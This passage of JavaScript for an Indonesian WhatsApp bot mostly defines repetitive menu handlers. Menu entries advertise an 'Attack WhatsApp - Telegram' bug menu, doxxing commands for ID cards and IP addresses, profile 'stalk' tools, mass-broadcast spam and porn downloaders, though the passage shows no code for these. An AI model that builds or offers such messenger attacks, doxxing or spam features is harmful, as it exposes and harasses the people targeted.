id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case 'othermenu':{
const teks12 = `╔─═⊱ *「 \`OTHER\` 」* ─═⬣
║┏⊱
║⿻ cekidgc
║⿻ rvo
║⿻ qc
║⿻ brat
║⿻ bratvideo
║⿻ bratanime
║⿻ emojimix
║⿻ emojigif
║⿻ stickerwm
║⿻ sticker
║⿻ infocrypto
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case 'stalkmenu': case 'stalkermenu': {
const teks12 = `╔─═⊱ *「 \`STALKER\` 」* ─═⬣
║┏⊱
║⿻ ffstalk
║⿻ mlstalk
║⿻ igstalk
║⿻ tiktokstalk
║⿻ githubstalk
║⿻ ytstalk
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case 'brat':{
if (!text) return reply(example('teksnya'))		
						
const teks = `Silahkan pilih type brat\nTeks Kamu :\n${text}`
await client.sendMessage(m.chat, {
  footer: `${author}`,
  buttons: [
    {
      buttonId: `.brat1 ${text}`,
      buttonText: { displayText: 'Brat iPhone' },
      type: 1
    },
    {
      buttonId: `.brat2 ${text}`,
      buttonText: { displayText: 'Brat Andro' },
      type: 1
    },
    {
      buttonId: `.bratvid ${text}`,
      buttonText: { displayText: 'Brat Video' },
      type: 1
    },
    {
      buttonId: `.bratanime ${text}`,
      buttonText: { displayText: 'Brat Anime' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: fs.readFileSync("./source/media/Xyz.jpg"),
  caption: `${teks}`,
  contextInfo: {
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namasaluran
   }
  },
}, {quoted: loli})
}
break;

case "brat2": {
if (!text) return reply(example('teksnya'))
let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await client.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case 'cfmenu': case 'cloudflaremenu': {  
const teks12 = `╔─═⊱ *「 \`CLOUDFLARE\` 」* ─═⬣
║┏⊱
║⿻ adddomaincf
║⿻ deldomaincf
║⿻ listdomaincf
║⿻ clearallsubdo
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case 'saluranmenu':{  
const teks12 = `╔─═⊱ *「 \`SALURAN\` 」* ─═⬣
║┏⊱
║⿻ cekidch
║⿻ addidch
║⿻ delidch
║⿻ listidch
║⿻ jpmallch
║⿻ jpmallch2
║⿻ joinch
║⿻ reactch
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case 'produkmenu':{ 
const teks12 = `╔─═⊱ *「 \`PRODUK\` 」* ─═⬣
║┏⊱
║⿻ addproduk
║⿻ delproduk
║⿻ checkproduk
║⿻ editproduk
║⿻ listproduk
║⿻ buyproduk
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;

case "scmenu": case "scriptmenu": {    
const teks12 = `╔─═⊱ *「 \`SCRIPT\` 」* ─═⬣
║┏⊱
║⿻ addscript
║⿻ delscript
║⿻ listscript
║⿻ infoscript
║⿻ belistockscript
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                                       

case 'searchmenu':{
const teks12 = `╔─═⊱ *「 \`SEARCH\` 」* ─═⬣
║┏⊱
║⿻ nsfw
║⿻ hentaineko
║⿻ hentaivideo
║⿻ r34
║⿻ yts
║⿻ apkmod
║⿻ pinterest
║⿻ sfile
║⿻ gimage
║⿻ xnxx
║⿻ playstore
║⿻ npmsearch
║⿻ tiktokstalk
║⿻ igstalk
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                    

case 'toolsmenu':{
const teks12 = `╔─═⊱ *「 \`TOOLSS\` 」* ─═⬣
│┏⊱
║⿻ autoai
║⿻ ai
║⿻ ai-islam
║⿻ ai-inggris
║⿻ gpt
║⿻ deepseek
║⿻ tourl
║⿻ tourlvid
║⿻ ssweb
║⿻ translate
║⿻ hd
║⿻ shortlink
║⿻ ocr
║⿻ nulis
║⿻ removebg
║⿻ readqr
║⿻ enc
║⿻ enchard
║⿻ encmed
║⿻ doxxingktp
║⿻ doxxingip
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;
             
case 'shopmenu':{
const teks12 = `╔─═⊱ *「 \`SHOP\` 」* ─═⬣
│┏⊱
║⿻ buypanel
║⿻ buyadp
║⿻ buyscript
║⿻ buyvps
║⿻ buyresellerpanel
║⿻ buyptpanel
║⿻ buyownpanel
║⿻ jasainstallpanel
║⿻ jasahbpanel
║⿻ jasainstalltema
║⿻ jasainstalltemaelysium
║⿻ jasainstalltemabilling
║⿻ jasainstalltemaenigma
║⿻ jasainstalltemanightcore
║⿻ buyjasashare
║⿻ buydigitalocean
║⿻ buyfitur
║⿻ qris
║⿻ dana
║⿻ gopay
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;
               
case 'downloadmenu':{
const teks12 = `╔─═⊱ *「 \`DOWNLOAD\` 」* ─═⬣
│┏⊱
║⿻ tiktok
║⿻ tiktokmp3
║⿻ facebook
║⿻ instagram
║⿻ ytmp3
║⿻ ytmp4
║⿻ play
║⿻ playvideo
║⿻ videy
║⿻ bokep
║⿻ pornhub
║⿻ gitclone
║⿻ mediafire
║⿻ capcut
║⿻ doodstream
║⿻ playspotify
║⿻ googledrive
║⿻ spotify
║⿻ terabox
║⿻ xnxxdl
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;
                         
case 'storemenu':{  
const teks12 = `╔─═⊱ *「 \`STORE\` 」* ─═⬣
│┏⊱
║⿻ addrespon
║⿻ delrespon
║⿻ listrespon
║⿻ done
║⿻ proses
║⿻ jpm
║⿻ jpm2
║⿻ playvideo
║⿻ jpmchfoto
║⿻ jpmallch
║⿻ jpmallch2 <memakai waktu>
║⿻ jpmtesti
║⿻ jpmslide
║⿻ jpmslideht
║⿻ sendtesti
║⿻ pushkontak
║⿻ pushkontak1
║⿻ pushkontak2
║⿻ savekontak
║⿻ savekontak2
║⿻ payment
║⿻ produk
║⿻ subdomain
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                                 
            
case "digitaloceanmenu": case "domenu": {
const teks12 = `╔─═⊱ *「 \`DIGITAL OCEAN\` 」* ─═⬣
│┏⊱
║⿻ cvps
║⿻ createvps
║⿻ gantipwvps
║⿻ changeapido
║⿻ checkdo
║⿻ turnon
║⿻ turnoff
║⿻ sisadroplet
║⿻ deldroplet
║⿻ listdroplet
║⿻ rebuild
║⿻ restartvps
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                                                         
  case "orkut": case "orderkuotah2h": case "orkutmenu": case "orderkuotamenu": {
const teks12 = `╔─═⊱ *「 \`ORKUT H2H\` 」* ─═⬣
║┏⊱
║⿻ cekstatus
║⿻ ceksaldo-orkut
║⿻ cekmutasi
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                                 
                        
case "panelmenureseller": case "panelmenu": {
const teks12 = `╔─═⊱ *「 \`PANEL\` 」* ─═⬣
│┏⊱
║⿻ addseller
║⿻ delseller
║⿻ listseller
║⿻ addserverpanel
║⿻ delserverpanel
║⿻ listserverpanel
║⿻ addaksesgrub
║⿻ delaksesgrub
║⿻ listaksesgrub
║⿻ 1gb - unlimited
║⿻ c1gb - cunli
║⿻ cadmin1
║⿻ cpanel
║⿻ delpanelall
║⿻ deluserall
║⿻ clearall
║⿻ deladminall
║⿻ cadmin
║⿻ delpanel
║⿻ deladmin
║⿻ listpanel
║⿻ listadmin
║⿻ linklog
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
header: 'Attack WhatsApp - Telegram',
title: 'Bug Menu',
description: 'Tampilkan Menu Bug',
id: '.bugmenu',
},
{
header: 'Menampilkan System Bot',
title: 'Bot Information',
description: 'Tampilkan System Bot',
id: '.infobot',
},
],
},
],
}),
},
},
],
headerType: 1,
viewOnce: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [m.sender],
externalAdReply: {
title: `Simple Bot - 2025`,
body: "WhatsApp Bot",
thumbnailUrl: `https://files.catbox.moe/dd7g0n.jpg`,
sourceUrl: `https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R`,
mediaType: 2,
renderLargerThumbnail: false
}
}
}, { quoted: loli })
}
break;                                 


case "panelmenuv2": case "panelmenu2": {
const teks12 = `╔─═⊱ *「 \`PANEL V2\` 」* ─═⬣
│┏⊱
║⿻ addseller-v2
║⿻ delseller-v2
║⿻ listseller-v2
║⿻ 1gb-v2 - unlimited-v2
║⿻ c1gb-v2 - cunli-v2
║⿻ cadmin1-v2
║⿻ cpanel-v2
║⿻ delpanelall-v2
║⿻ deluserall-v2
║⿻ clearall-v2
║⿻ deladminall-v2
║⿻ cadmin-v2
║⿻ delpanel-v2
║⿻ deladmin-v2
║⿻ listpanel-v2
║⿻ listadmin-v2
║⿻ linklog-v2
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
id: '.ownermenu',
},
{
